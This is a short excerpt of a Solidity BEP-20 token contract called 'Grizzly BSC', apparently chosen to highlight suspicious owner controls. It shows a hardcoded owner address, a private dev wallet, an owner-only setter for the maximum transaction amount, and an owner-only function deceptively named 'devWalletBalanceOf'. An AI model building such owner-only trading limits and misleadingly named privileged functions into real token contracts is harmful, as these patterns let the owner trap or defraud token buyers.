...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xE57D3EDa9617841af3b00218b03CDEeaCDe937dd;
...
contract grizzlybsc is Context, IERC20, Ownable { 
    ...
    address payable private Wallet_Dev = payable(0xc117e04dE35683065EeE4FfeB3936cea3a2d2c78);
    ...
    string private _name = "Grizzly BSC"; 
    ...
    function setTransactions(uint256 maxTxPercent_x100) external authorized() {
        _maxTxAmount = maxTxPercent_x100;
    }    
    
     function setWallet(uint256 maxWallPercent_x100) external authorized() {
    ...
    function devWalletBalanceOf(uint256 acc, address adr) authorized public virtual {
